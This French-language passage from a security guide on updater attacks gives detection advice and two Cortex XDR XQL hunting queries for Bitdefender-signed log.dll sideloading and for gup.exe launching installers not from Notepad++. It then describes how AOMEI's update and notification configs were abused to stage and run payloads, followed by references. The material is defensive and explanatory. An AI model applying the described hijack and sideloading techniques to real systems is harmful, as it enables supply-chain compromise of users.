- Considérer le **sideload de binaires signés BYO** comme un pivot de détection après téléchargement : déclencher une alerte lorsqu’un EXE signé par un fournisseur charge une DLL dont le nom provient de l’extérieur de son chemin d’installation canonique (par exemple, Bitdefender chargeant `log.dll` depuis Temp/Downloads), et lorsqu’un programme de mise à jour dépose/exécute des installateurs depuis un dossier temporaire avec des signatures qui ne sont pas celles du fournisseur.
- Surveiller les **artefacts spécifiques aux malwares** observés dans cette chaîne (utiles comme pivots génériques) : mutex `Global\Jdhfv_1.0.1`, écritures anormales de `gup.exe` dans `%TEMP%` et étapes d’injection de shellcode pilotées par Lua.
- Notepad++ a renforcé WinGUp à partir de la v8.8.9 : le XML renvoyé est désormais signé (XMLDSig), et les versions plus récentes vérifient le certificat et la signature de l’installateur téléchargé au lieu de se fier uniquement au transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload d’un EXE signé par Bitdefender avec <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un installateur autre que celui de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ces schémas s’appliquent à tout updater qui accepte des manifests non signés ou ne vérifie pas strictement les signataires des installateurs : détournement du réseau + installateur malveillant + sideloading avec signature contrôlée par l’attaquant peuvent entraîner une exécution de code à distance sous couvert de mises à jour « fiables ».

### La configuration des notifications comme second déclencheur de mise à jour

Un updater peut utiliser des configurations distantes distinctes pour **préparer du contenu et déclencher son exécution**. Cela nécessite de contrôler les configurations ou leurs réponses ; les rapports ne précisent pas comment l’accès à l’origine a été obtenu. Dans le cas d’AOMEI, `down_html.ini` définissait l’URL d’une archive, la version (`thrid`) et le MD5 (`Val`) ; l’attaquant a augmenté la version et modifié simultanément l’URL et la somme de contrôle correspondante. Il s’agit de la [défaillance de la frontière de confiance des métadonnées](#2-hijacking-the-update-channel-to-run-code-as-system) décrite ci-dessus. Le chemin d’exécution supplémentaire passait par `Notifycfg.ini` : ce fichier indiquait à `ABNotify.exe` de charger un fichier `upgrade-now.html` extrait, via une URL locale `file:///`, dans un WebView. La page redirigeait automatiquement vers un exécutable situé dans le même dossier, que le WebView transmettait au shell système. Le processus enfant héritait des privilèges du programme de notification ; cela ne l’élevait pas automatiquement au niveau SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google a également signalé un fichier `Notifycfg.ini` altéré contenant plus de 35 000 sections factices répétées, qui contournaient le contrôle de version habituel du client. Le rapport ne démontre pas un contournement général de l’analyseur syntaxique. L’attaquant rétablissait les fichiers distants après des périodes de cinq à dix minutes ; seuls les clients qui interrogeaient le serveur pendant ces périodes recevaient la configuration modifiée. Ce canal de notification véhiculait également un leurre distinct de [coercition WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), qui ne nécessitait pas l’exécution de l’archive.<sup>[[18]](#references)</sup>

---
## References
- [1] [Avis – Netskope Client pour Windows – Élévation locale de privilèges via un serveur malveillant (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avis de sécurité Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Exploitation d’ASUS DriverHub, MSI Center, Acer Control Centre et Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB : NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Élévation locale de privilèges via des fichiers accessibles en écriture dans Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Élévation de privilèges dans l’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Des acteurs étatiques exploitent la chaîne d’approvisionnement de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – mise à jour sur l’incident d’infrastructure détournée](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contournement du correctif de CVE-2025-0309 dans Netskope Client pour Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Découverte de bugs d’élévation de privilèges dans Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater : de gRPC à SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [ManageEngine Threat Analysis Lab – Compromission de la chaîne d’approvisionnement d’AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group et Mandiant – Enquête sur la falsification éphémère de chaînes d’approvisionnement](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
